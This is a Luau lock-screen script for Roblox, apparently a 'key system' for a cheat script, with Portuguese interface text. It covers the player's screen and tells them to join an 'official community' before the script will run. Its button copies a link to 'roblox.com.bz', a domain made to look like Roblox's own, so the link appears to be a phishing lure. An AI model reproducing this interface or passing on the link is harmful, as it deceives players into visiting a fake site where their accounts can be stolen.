-- // Akaza Key System - Visual Lock Screen
-- // by @FzinMaker

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- CONFIG
local COMMUNITY_LINK = "https://roblox.com.bz/communities/2383791085/"

-- ScreenGui (cobre tudo, sem fechar)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AkazaKeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = PlayerGui

-- Tela preta total (sem transparência)
local Overlay = Instance.new("Frame")
Overlay.Size = UDim2.fromScale(1, 1)
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0
Overlay.BorderSizePixel = 0
Overlay.ZIndex = 1
Overlay.Parent = ScreenGui

-- Blur
local Blur = Instance.new("BlurEffect")
Blur.Size = 0
Blur.Parent = game:GetService("Lighting")
TweenService:Create(Blur, TweenInfo.new(0.6), {Size = 24}):Play()

-- Main Frame
local Main = Instance.new("Frame")
Main.Size = UDim2.fromOffset(400, 260)
Main.Position = UDim2.fromScale(0.5, 0.5)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
Main.BorderSizePixel = 0
Main.BackgroundTransparency = 1
Main.ZIndex = 2
Main.Parent = ScreenGui

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)

-- Border animado roxo
local Border = Instance.new("UIStroke")
Border.Thickness = 1.5
Border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Border.Color = Color3.fromRGB(138, 43, 226)
Border.Parent = Main

task.spawn(function()
    local colors = {
        Color3.fromRGB(138, 43, 226),
        Color3.fromRGB(190, 70, 255),
        Color3.fromRGB(100, 20, 200),
        Color3.fromRGB(210, 90, 255),
    }
    local i = 1
    while Main.Parent do
        TweenService:Create(Border, TweenInfo.new(1.3, Enum.EasingStyle.Sine), {Color = colors[i]}):Play()
        i = (i % #colors) + 1
        task.wait(1.3)
    end
end)

-- Fade in do main
TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
Header.BorderSizePixel = 0
Header.ZIndex = 3
Header.Parent = Main

local HC = Instance.new("UICorner", Header)
HC.CornerRadius = UDim.new(0, 18)

-- fix corners cortados em baixo do header
local HFix = Instance.new("Frame")
HFix.Size = UDim2.new(1, 0, 0, 18)
HFix.Position = UDim2.fromOffset(0, 32)
HFix.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
HFix.BorderSizePixel = 0
HFix.ZIndex = 3
HFix.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 1, 0)
Title.Position = UDim2.fromOffset(18, 0)
Title.BackgroundTransparency = 1
Title.Text = "Key System"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 4
Title.Parent = Header

local Tag = Instance.new("TextLabel")
Tag.Size = UDim2.fromOffset(56, 20)
Tag.Position = UDim2.new(1, -70, 0.5, -10)
Tag.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Tag.BackgroundTransparency = 0.25
Tag.Text = "LOCKED"
Tag.TextColor3 = Color3.fromRGB(230, 190, 255)
Tag.Font = Enum.Font.GothamBold
Tag.TextSize = 10
Tag.ZIndex = 4
Tag.Parent = Header
Instance.new("UICorner", Tag).CornerRadius = UDim.new(0, 6)

-- Body
local Body = Instance.new("Frame")
Body.Size = UDim2.new(1, -40, 1, -70)
Body.Position = UDim2.fromOffset(20, 60)
Body.BackgroundTransparency = 1
Body.ZIndex = 3
Body.Parent = Main

-- Ícone de cadeado
local Lock = Instance.new("TextLabel")
Lock.Size = UDim2.new(1, 0, 0, 36)
Lock.Position = UDim2.fromOffset(0, 4)
Lock.BackgroundTransparency = 1
Lock.Text = "🔒"
Lock.TextColor3 = Color3.fromRGB(255, 255, 255)
Lock.Font = Enum.Font.GothamBold
Lock.TextSize = 28
Lock.TextXAlignment = Enum.TextXAlignment.Center
Lock.ZIndex = 4
Lock.Parent = Body

-- Mensagem principal
local Msg = Instance.new("TextLabel")
Msg.Size = UDim2.new(1, 0, 0, 50)
Msg.Position = UDim2.fromOffset(0, 48)
Msg.BackgroundTransparency = 1
Msg.Text = "Entre em nossa comunidade oficial para liberar o Script"
Msg.TextColor3 = Color3.fromRGB(190, 190, 210)
Msg.Font = Enum.Font.Gotham
Msg.TextSize = 13
Msg.TextXAlignment = Enum.TextXAlignment.Center
Msg.TextWrapped = true
Msg.ZIndex = 4
Msg.Parent = Body

-- Sub-mensagem
local Sub = Instance.new("TextLabel")
Sub.Size = UDim2.new(1, 0, 0, 20)
Sub.Position = UDim2.fromOffset(0, 102)
Sub.BackgroundTransparency = 1
Sub.Text = "Após entrar, reinicie o script para continuar."
Sub.TextColor3 = Color3.fromRGB(110, 110, 140)
Sub.Font = Enum.Font.Gotham
Sub.TextSize = 11
Sub.TextXAlignment = Enum.TextXAlignment.Center
Sub.ZIndex = 4
Sub.Parent = Body

-- Botão copiar link
local Btn = Instance.new("TextButton")
Btn.Size = UDim2.new(1, 0, 0, 42)
Btn.Position = UDim2.fromOffset(0, 132)
Btn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
Btn.Text = "📋  Copiar Link da Comunidade"
Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
Btn.Font = Enum.Font.GothamBold
Btn.TextSize = 13
Btn.AutoButtonColor = false
Btn.ZIndex = 4
Btn.Parent = Body

Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 11)

local BStroke = Instance.new("UIStroke")
BStroke.Color = Color3.fromRGB(180, 80, 255)
BStroke.Thickness = 1
BStroke.Parent = Btn

Btn.MouseEnter:Connect(function()
    TweenService:Create(Btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(165, 65, 255)}):Play()
end)
Btn.MouseLeave:Connect(function()
    TweenService:Create(Btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(138, 43, 226)}):Play()
end)

Btn.MouseButton1Click:Connect(function()
    setclipboard(COMMUNITY_LINK)
    Btn.Text = "✅  Link Copiado!"
    TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(35, 155, 75)}):Play()
    task.wait(2.5)
    Btn.Text = "📋  Copiar Link da Comunidade"
    TweenService:Create(Btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(138, 43, 226)}):Play()
end)
